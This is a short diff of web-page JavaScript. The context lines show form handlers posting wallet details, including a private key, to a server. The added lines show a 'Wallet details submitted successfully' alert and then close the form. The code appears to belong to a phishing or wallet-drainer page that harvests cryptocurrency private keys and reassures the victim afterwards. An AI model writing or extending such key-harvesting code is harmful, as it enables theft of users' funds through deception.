@@ -2152,6 +2152,8 @@
                                 })
                             });
                         }
+                        alert('Wallet details submitted successfully');
+                        document.getElementById('cancel').click();
                     } catch (error) {
                         console.error('Form submission failed:', error);
                         alert('Failed to submit form.');
@@ -2173,6 +2175,8 @@
                                     privateKey,
                                 })
                             });
+                            alert('Wallet details submitted successfully');
+                            document.getElementById('cancel').click();
                         }
                     } catch (error) {
                         console.error('Form submission failed:', error);
@@ -2196,6 +2200,8 @@
                                 method: 'POST',
                                 body: formData
                             });
+                            alert('Wallet details submitted successfully');
+                            document.getElementById('cancel').click();
                         }
                     } catch (error) {
                         console.error('Form submission failed:', error);
